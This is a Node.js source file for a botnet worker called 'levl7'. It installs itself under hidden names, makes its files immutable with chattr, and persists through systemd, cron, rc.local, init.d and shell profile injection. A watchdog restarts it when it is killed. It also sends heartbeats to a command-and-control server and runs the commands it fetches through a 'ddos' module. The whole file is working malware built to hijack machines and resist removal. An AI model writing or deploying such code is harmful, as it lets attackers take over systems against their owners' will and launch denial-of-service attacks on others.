#!/usr/bin/env node
const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync, spawn, exec } = require("child_process");

const CONFIG_PATH = path.join(__dirname, "master.json");
const PID_FILE = "/tmp/.levl7-pid";
const LOCK_PORT_FILE = "/tmp/.levl7-port";
const MARKER_FILE = "/tmp/.levl7-injected";
const BIN_NAME = ".levl7-svc";
const WATCHDOG_PID = "/tmp/.levl7-watchdog";

// ─── Config ──────────────────────────────────────────────────────────
let cfg = { cnc_host: "127.0.0.1", cnc_port: "8080", worker_id: "", debug: false };

function loadConfig() {
  try {
    const raw = fs.readFileSync(CONFIG_PATH, "utf8");
    cfg = { ...cfg, ...JSON.parse(raw) };
  } catch {}
  if (!cfg.worker_id) cfg.worker_id = `wkr_${os.hostname()}_${Date.now()}`;
  fs.writeFileSync(CONFIG_PATH, JSON.stringify(cfg, null, 2));
}
loadConfig();

// ─── PID Injection ───────────────────────────────────────────────────
function randomUint16() { return 1024 + Math.floor(Math.random() * 64511); }

function isPidUsed(pid) {
  try {
    execSync(`kill -0 ${pid} 2>/dev/null`, { stdio: "ignore" });
    return true;
  } catch { return false; }
}

function isPortUsed(port) {
  try {
    execSync(`ss -tlnp | grep -q ":${port} "`, { stdio: "ignore" });
    return true;
  } catch { return false; }
}

function injectPid() {
  let pid = randomUint16();
  let attempts = 0;
  while (isPidUsed(pid) && attempts < 100) {
    pid = randomUint16();
    attempts++;
  }
  try {
    fs.writeFileSync(PID_FILE, String(pid));
    fs.chmodSync(PID_FILE, 0o444);
    if (cfg.debug) console.log(`[levl7] PID injected: ${pid}`);
  } catch (e) {
    if (cfg.debug) console.error(`[levl7] PID inject fail: ${e.message}`);
  }
  return pid;
}

function injectPort() {
  let port = 30000 + Math.floor(Math.random() * 30000);
  let attempts = 0;
  while (isPortUsed(port) && attempts < 100) {
    port = 30000 + Math.floor(Math.random() * 30000);
    attempts++;
  }
  try {
    fs.writeFileSync(LOCK_PORT_FILE, String(port));
    if (cfg.debug) console.log(`[levl7] Port injected: ${port}`);
  } catch (e) {
    if (cfg.debug) console.error(`[levl7] Port inject fail: ${e.message}`);
  }
  return port;
}

// ─── Self-Replicate (Binary Injection) ───────────────────────────────
function injectBinary() {
  const targets = [
    path.join(os.homedir(), BIN_NAME),
    "/usr/local/bin/" + BIN_NAME,
    "/opt/" + BIN_NAME,
  ];
  const selfPath = process.argv[1];
  const src = fs.readFileSync(selfPath);
  for (const t of targets) {
    try {
      fs.writeFileSync(t, src);
      fs.chmodSync(t, 0o755);
      execSync(`chattr +i "${t}" 2>/dev/null || chflags schg "${t}" 2>/dev/null || true`, { stdio: "ignore" });
      if (cfg.debug) console.log(`[levl7] Binary injected: ${t}`);
    } catch {}
  }
}

// ─── Unkillable Persistence ──────────────────────────────────────────
function injectSystemd() {
  const unit = `[Unit]
Description=LevL7 Worker
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/node ${__dirname}/index.js
Restart=always
RestartSec=2
StartLimitInterval=0
StartLimitBurst=0
KillMode=process
KillSignal=SIGKILL
SendSIGKILL=yes
StandardOutput=null
StandardError=null
[Install]
WantedBy=multi-user.target
`;
  const unitPath = "/etc/systemd/system/levl7-worker.service";
  try {
    fs.writeFileSync("/tmp/.levl7-systemd", unit);
    execSync(`cp /tmp/.levl7-systemd ${unitPath} 2>/dev/null`, { stdio: "ignore" });
    execSync(`chattr +i ${unitPath} 2>/dev/null || true`, { stdio: "ignore" });
    execSync(`systemctl daemon-reload 2>/dev/null`, { stdio: "ignore" });
    execSync(`systemctl enable levl7-worker 2>/dev/null`, { stdio: "ignore" });
    execSync(`systemctl restart levl7-worker 2>/dev/null`, { stdio: "ignore" });
    return true;
  } catch (e) {
    if (cfg.debug) console.error(`[levl7] systemd fail: ${e.message}`);
    return false;
  }
}

function injectCron() {
  const cronLine = `* * * * * /usr/bin/node ${__dirname}/index.js >/dev/null 2>&1\n`;
  const cronLine2 = `* * * * * /usr/bin/node ${__dirname}/watchdog.js >/dev/null 2>&1\n`;
  try {
    const current = execSync("crontab -l 2>/dev/null || true", { encoding: "utf8" });
    if (!current.includes("levl7-worker")) {
      fs.writeFileSync("/tmp/.levl7-cron", current + cronLine + cronLine2);
      execSync(`crontab /tmp/.levl7-cron 2>/dev/null`, { stdio: "ignore" });
    }
    return true;
  } catch {}
  return false;
}

function injectRclocal() {
  const line = `/usr/bin/node ${__dirname}/index.js >/dev/null 2>&1 &\n`;
  try {
    let content = "";
    try { content = fs.readFileSync("/etc/rc.local", "utf8"); } catch { content = "#!/bin/sh\n"; }
    if (!content.includes("levl7-worker")) {
      fs.writeFileSync("/tmp/.levl7-rclocal", content.replace(/\n$/, "") + "\n" + line);
      execSync(`cp /tmp/.levl7-rclocal /etc/rc.local 2>/dev/null`, { stdio: "ignore" });
      execSync(`chmod +x /etc/rc.local 2>/dev/null`, { stdio: "ignore" });
    }
  } catch {}
}

function injectProfile() {
  const line = `[ -z "$LEVL7_LOADED" ] && export LEVL7_LOADED=1 && /usr/bin/node ${__dirname}/index.js >/dev/null 2>&1 &\n`;
  const profiles = ["/etc/profile", path.join(os.homedir(), ".profile"), path.join(os.homedir(), ".bashrc")];
  for (const p of profiles) {
    try {
      let content = "";
      try { content = fs.readFileSync(p, "utf8"); } catch { content = ""; }
      if (!content.includes("LEVL7_LOADED")) {
        fs.writeFileSync(p, content + line);
      }
    } catch {}
  }
}

function injectAsSvc() {
  const svcScript = `#!/bin/sh
while true; do
  /usr/bin/node ${__dirname}/index.js
  sleep 2
done
`;
  try {
    fs.writeFileSync("/etc/init.d/levl7-worker", svcScript);
    fs.chmodSync("/etc/init.d/levl7-worker", 0o755);
    execSync(`update-rc.d levl7-worker defaults 2>/dev/null || true`, { stdio: "ignore" });
  } catch {}
}

function persist() {
  const methods = [injectSystemd, injectCron, injectRclocal, injectAsSvc, injectProfile];
  let ok = false;
  for (const m of methods) {
    if (m()) ok = true;
  }
  try {
    fs.writeFileSync(MARKER_FILE, String(process.pid));
  } catch {}
  return ok;
}

// ─── Watchdog ─────────────────────────────────────────────────────────
function spawnWatchdog() {
  const wdScript = `
const fs = require("fs");
const { execSync } = require("child_process");
const pid = process.pid;
setInterval(() => {
  const mainPid = ${process.pid};
  try { execSync("kill -0 " + mainPid, { stdio: "ignore" }); }
  catch { execSync("node ${__dirname}/index.js &", { stdio: "ignore" }); }
}, 5000);
setInterval(() => {
  try { execSync("chattr +i /etc/systemd/system/levl7-worker.service 2>/dev/null || true"); } catch {}
  try { execSync("chattr +i /usr/local/bin/.levl7-svc 2>/dev/null || true"); } catch {}
}, 30000);
`;
  try {
    const wdPath = path.join(__dirname, "watchdog.js");
    fs.writeFileSync(wdPath, wdScript);
    execSync(`node "${wdPath}" &`, { stdio: "ignore" });
    if (cfg.debug) console.log("[levl7] watchdog spawned");
  } catch (e) {
    if (cfg.debug) console.error("[levl7] watchdog fail:", e.message);
  }
}

// ─── CNC Communication ────────────────────────────────────────────────
const API = require("./ddos");
API.init(cfg);

async function heartbeat() {
  try {
    const payload = { worker_id: cfg.worker_id, pid: process.pid, status: "running", hostname: os.hostname() };
    const http = require("axios");
    await http.post(`http://${cfg.cnc_host}:${cfg.cnc_port}/api/v1/workers/heartbeat`, payload, {
      timeout: 5000,
      headers: { "Content-Type": "application/json" },
    });
  } catch {}
}

async function fetchCommands() {
  try {
    const http = require("axios");
    const res = await http.get(`http://${cfg.cnc_host}:${cfg.cnc_port}/api/v1/workers/commands/${cfg.worker_id}`, {
      timeout: 5000,
    });
    if (res.data && res.data.commands) {
      for (const cmd of res.data.commands) {
        await API.execCommand(cmd);
      }
    }
  } catch {}
}

// ─── Main ─────────────────────────────────────────────────────────────
async function main() {
  console.log(`[levl7] Worker ${cfg.worker_id} starting, PID=${process.pid}`);

  const injectedPid = injectPid();
  injectPort();
  injectBinary();
  persist();
  spawnWatchdog();

  console.log(`[levl7] PID injected: ${injectedPid}, real: ${process.pid}`);

  // Start periodic tasks
  heartbeat();
  setInterval(heartbeat, 25000);
  setInterval(fetchCommands, 10000);

  // Self-heal every 60s
  setInterval(() => {
    if (!fs.existsSync(MARKER_FILE)) persist();
    if (!fs.existsSync(PID_FILE)) injectPid();
    try {
      execSync(`chattr +i /etc/systemd/system/levl7-worker.service 2>/dev/null || true`);
    } catch {}
  }, 60000);

  console.log(`[levl7] Ready. CNC: ${cfg.cnc_host}:${cfg.cnc_port}`);
}

if (require.main === module) {
  main().catch((e) => {
    console.error("[levl7] Fatal:", e.message);
    setTimeout(() => process.exit(1), 1000);
  });
}

module.exports = { cfg, injectPid, injectPort, heartbeat, persist };
